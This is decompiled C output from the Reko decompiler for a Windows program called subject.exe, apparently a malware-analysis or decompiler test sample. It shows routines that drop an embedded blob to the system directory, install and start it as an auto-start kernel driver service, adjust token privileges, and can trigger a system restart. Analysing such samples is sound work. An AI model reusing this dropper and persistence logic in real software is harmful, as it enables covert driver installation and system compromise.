// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register byte fn00401000(Stack Eq_3 dwArg04)
byte fn00401000(LPCSTR dwArg04)
{
	byte al_38;
	Eq_5 eax_28 = CreateFileA(dwArg04, 0x40000000, 0x07, null, 0x02, 0x80, null);
	if (eax_28 == (void *) ~0x00)
		al_38 = 0x00;
	else
	{
		WriteFile(eax_28, &globals->v403010, globals->t403008, fp - 0x08, null);
		CloseHandle(eax_28);
		al_38 = 0x01;
	}
	return al_38;
}

// 0040104F: void fn0040104F()
void fn0040104F()
{
	if (OpenProcessToken(GetCurrentProcess(), 0x000200E0, fp - 0x08) != 0x00 && LookupPrivilegeValueA(null, &globals->t402060, fp - 0x10) != 0x00)
	{
		AdjustTokenPrivileges(null, 0x00, fp - 0x20, 0x10, null, null);
		GetLastError();
	}
}

// 004010C7: void fn004010C7(Register word32 ebp)
void fn004010C7(word32 ebp)
{
	if (GetSystemDirectoryA(fp - 0x0240, 0x0104) == 0x00 || SetCurrentDirectoryA(fp - 0x0240) == 0x00)
		return;
	ptr32 esp_296 = fp - 0x0264;
	Eq_5 eax_85 = OpenEventA(0x00100002, 0x00, &globals->t402090);
	if (eax_85 != null)
	{
		SetEvent(eax_85);
		CloseHandle(eax_85);
		esp_296 = fp - 0x026C;
	}
	LPSTR ** esp_94 = esp_296 - 0x04;
	*esp_94 = (LPSTR **) (fp - 0x18);
	*(esp_94 - 0x04) = fp - 0x0138;
	*(esp_94 - 0x08) = 0x0104;
	*(esp_94 - 0x0C) = 0x00402080;
	GetFullPathNameA(*(esp_94 - 0x0C), *(esp_94 - 0x08), *(esp_94 - 0x04), *esp_94);
	*(esp_94 - 0x10) = 0x40000000;
	*(esp_94 - 0x14) = 0x00;
	*(esp_94 - 0x18) = 0x00;
	byte bLoc05_103 = 0x00;
	SC_HANDLE * esp_109 = esp_94 - 0x18;
	Eq_199 eax_111 = OpenSCManagerA(*(esp_94 - 0x18), *(esp_94 - 0x14), *(esp_94 - 0x10));
	if (eax_111 == null)
	{
l00401210:
		if (eax_85 == null && bLoc05_103 != 0x00)
		{
			fn0040104F();
			if (0x00 != 0x00)
			{
				DWORD * esp_143 = esp_109 - 0x04;
				*esp_143 = (uint32) 0x00;
				*(esp_143 - 0x04) = 0x12;
				ExitWindowsEx(*(esp_143 - 0x04), *esp_143);
			}
		}
		return;
	}
	*(esp_94 - 0x1C) = 0x00;
	*(esp_94 - 0x20) = 0x00;
	*(esp_94 - 0x24) = 0x00;
	*(esp_94 - 0x28) = 0x00;
	*(esp_94 - 44) = 0x00;
	*(esp_94 - 0x30) = fp - 0x0138;
	*(esp_94 - 0x34) = 0x01;
	*(esp_94 - 0x38) = 0x02;
	*(esp_94 - 0x3C) = 0x01;
	*(esp_94 - 0x40) = 0x000F01FF;
	*(esp_94 - 0x44) = 0x00402074;
	*(esp_94 - 0x48) = 0x00402074;
	*(esp_94 - 0x4C) = (SC_HANDLE *) eax_111;
	Eq_199 eax_177 = CreateServiceA(*(esp_94 - 0x4C), *(esp_94 - 0x48), *(esp_94 - 0x44), *(esp_94 - 0x40), *(esp_94 - 0x3C), *(esp_94 - 0x38), *(esp_94 - 0x34), *(esp_94 - 0x30), *(esp_94 - 44), *(esp_94 - 0x28), *(esp_94 - 0x24), *(esp_94 - 0x20), *(esp_94 - 0x1C));
	SC_HANDLE * esp_175 = esp_94 - 0x4C;
	Eq_199 dwLoc0C_180 = eax_177;
	if (eax_177 == null)
	{
		if (GetLastError() == 0x0431)
		{
			*(esp_94 - 0x50) = 0x000F01FF;
			*(esp_94 - 0x54) = 0x00402074;
			*(esp_94 - 88) = (SC_HANDLE *) eax_111;
			Eq_199 eax_255 = OpenServiceA(*(esp_94 - 88), *(esp_94 - 0x54), *(esp_94 - 0x50));
			esp_175 = esp_94 - 88;
			dwLoc0C_180 = eax_255;
			if (eax_255 == null)
				goto l00401207;
			*(esp_94 - 0x5C) = fp - 0x34;
			*(esp_94 - 0x60) = 0x01;
			*(esp_94 - 100) = (SC_HANDLE *) eax_255;
			ControlService(*(esp_94 - 100), *(esp_94 - 0x60), *(esp_94 - 0x5C));
			*(esp_94 - 0x68) = 0x00402074;
			*(esp_94 - 0x6C) = 0x00;
			*(esp_94 - 0x70) = 0x00;
			*(esp_94 - 116) = 0x00;
			*(esp_94 - 0x78) = 0x00;
			*(esp_94 - 0x7C) = 0x00;
			*(esp_94 - 0x80) = fp - 0x0138;
			*(esp_94 - 0x84) = 0x01;
			*(esp_94 - 0x88) = 0x02;
			*(esp_94 - 0x8C) = 0x01;
			*(esp_94 - 0x90) = (SC_HANDLE *) eax_255;
			ChangeServiceConfigA(*(esp_94 - 0x90), *(esp_94 - 0x8C), *(esp_94 - 0x88), *(esp_94 - 0x84), *(esp_94 - 0x80), *(esp_94 - 0x7C), *(esp_94 - 0x78), *(esp_94 - 116), *(esp_94 - 0x70), *(esp_94 - 0x6C), *(esp_94 - 0x68));
			esp_175 = esp_94 - 0x90;
			bLoc05_103 = 0x01;
		}
		if (dwLoc0C_180 == null)
			goto l00401207;
		ptr32 * esp_239 = esp_175 - 0x04;
		*esp_239 = fp - 0x0138;
		esp_175 = (SC_HANDLE *) (esp_239 + 0x01);
		if (fn00401000(dwArg00) == 0x00)
		{
l004011F9:
			if (dwLoc0C_180 != null)
			{
				esp_175 = esp_175 - 0x04;
				*esp_175 = (SC_HANDLE *) dwLoc0C_180;
				CloseServiceHandle(*esp_175);
			}
l00401207:
			esp_109 = esp_175 - 0x04;
			*esp_109 = (SC_HANDLE *) eax_111;
			CloseServiceHandle(*esp_109);
			goto l00401210;
		}
	}
	LPCSTR ** esp_220 = esp_175 - 0x04;
	*esp_220 = (LPCSTR **) null;
	*(esp_220 - 0x04) = 0x00;
	*(esp_220 - 0x08) = (SC_HANDLE *) dwLoc0C_180;
	StartServiceA(*(esp_220 - 0x08), *(esp_220 - 0x04), *esp_220);
	esp_175 = esp_220 - 0x08;
	goto l004011F9;
}

